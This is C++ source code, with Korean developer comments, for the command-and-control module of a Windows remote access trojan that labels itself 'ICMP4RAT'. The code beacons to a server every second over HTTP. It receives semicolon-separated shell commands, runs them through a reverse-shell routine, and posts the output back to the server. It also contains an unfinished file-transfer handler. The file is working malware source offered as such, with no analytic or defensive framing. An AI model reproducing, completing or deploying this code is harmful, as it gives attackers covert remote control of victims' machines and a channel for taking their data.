#include <stdlib.h>
#include <iostream>
#include <string>
#include <map>
#include <ole2.h>
#include <olectl.h>
#include <list>
#include <sstream>
#include "cncManager.h"
#include "commandManager.h"

cncManager::cncManager() {
}


cncManager::cncManager(LPCWSTR server) {
	this->server = server;
}

cncManager::~cncManager() {
    if (this->hRequest) WinHttpCloseHandle(this->hRequest);
    if (this->hConnect) WinHttpCloseHandle(this->hConnect);
    if (this->hSession) WinHttpCloseHandle(this->hSession);
}

/* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
    this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (this->hSession)
        this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);

    if (this->hConnect)
        this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    if (this->hRequest)
        this->bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);

    if (this->bResults)
        this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);

    if (!this->bResults)
        std::cout << "Error" << GetLastError() << "has occurred." << std::endl;

    if (this->bResults)
    {
        do
        {
            /*Check for available data.*/
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // No more available data.
            if (!dwSize)
                break;

            // Allocate space for the buffer.
            LPSTR pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                break;
            }

            // Read the Data.
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                printf("Error %u in WinHttpReadData.\n", GetLastError());

            else
                //std::wcout << pszOutBuffer << std::endl;
                this->responseParser((UCHAR *)pszOutBuffer, dwSize);

            delete[] pszOutBuffer;

            if (!dwDownloaded)
                break;

        } while (dwSize > 0);
    }

    if (this->hRequest) WinHttpCloseHandle(this->hRequest);
    if (this->hConnect) WinHttpCloseHandle(this->hConnect);
    if (this->hSession) WinHttpCloseHandle(this->hSession);
}   
/* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
    if (dlen <= 0xffff) {
        DDprotocol* ftpFrame = new DDprotocol;
        ftpFrame->type = DDtype;
        ftpFrame->len = dlen;
        ftpFrame->seq = 0;

        UCHAR* stream = new UCHAR[sizeof(DDprotocol) + dlen];
        memset(stream, 0, sizeof(DDprotocol) + dlen);
        memcpy(stream, ftpFrame, sizeof(DDprotocol));
        memcpy(stream + sizeof(DDprotocol), data, dlen);

        this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + dlen);
        delete ftpFrame;
        delete[] stream;
        
    }
    /* 이쪽 seq로 잘라서 데이터 보내는거 구현해야함. */
    //else
}
/* C&C에 beacon 보내는 함수. sendHttpRequest를 Wrapping함.*/
/* 이 함수는 별도 스레드로 돌려야할듯. */
void cncManager::sendBeacon() {
	DDprotocol* beaconFrame = new DDprotocol;
	beaconFrame->type = beaconRequest;
	beaconFrame->len = 0;
	beaconFrame->seq = 0;

	while (TRUE) {
		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
		Sleep(1000);
	}
}

void cncManager::responseParser(UCHAR* res, DWORD len) {
    if (len < 8)
        std::cout << "Invalid Protocol !!!" << std::endl;
    
    else
    {
        DDprotocol* resData = new DDprotocol;
        resData->header = res[0];
        resData->type = res[1];
        resData->len = *(USHORT *)(res+2);
        resData->seq = *(DWORD *)(res+4);
        ///* For DEBUG */
        //printf("-------------------\n");
        //printf("header : 0x%x\ntype   : 0x%x\nlen    : 0x%x\nseq    : 0x%x\n", resData->header, resData->type, resData->len, resData->seq);
        //printf("-------------------\n");

        if (resData->header != DDPROTO_HEADER)
            std::cout << "Invalid Header !!!" << std::endl;

        else {
            std::string data = (char*)(res + 8);
            /* response 핸들러 구현부 */
            switch (resData->type)
            {
            case error:
                std::cout << "error request !!!" << std::endl;
                break;

            case beaconResponse:
                std::cout << "beaconResponse !!!" << std::endl;
                break;

            case shellRequest:
            {
                std::cout << "shellRequest !!!" << std::endl;
                std::istringstream spliter(data);
                std::string tmp;
                while (std::getline(spliter, tmp, ';')) {
                    this->shellCmd.push_back(tmp);
                }
                break;
            }

            case ftpReqeust:
                std::cout << "ftpReqeust !!!" << std::endl;
                break;

            case none:
                //std::cout << "none !!!" << std::endl;
                break;

            default:
                std::cout << "Invalid type !!!" << std::endl;
                break;
            }

            delete resData;
        }
    }

}

void cncManager:: handleShellRequest(commandManager& commander) {
    std::string result;
    while (TRUE) {
        /* For DEBUG */
        this->sendData(1, 0, NULL);

        while (!this->shellCmd.empty()) {
            result = commander.reverseShell(this->shellCmd.front());
            /* For DEBUG */
            std::cout << result;
            this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
            this->shellCmd.pop_front();
        }
            Sleep(1000);
    }
}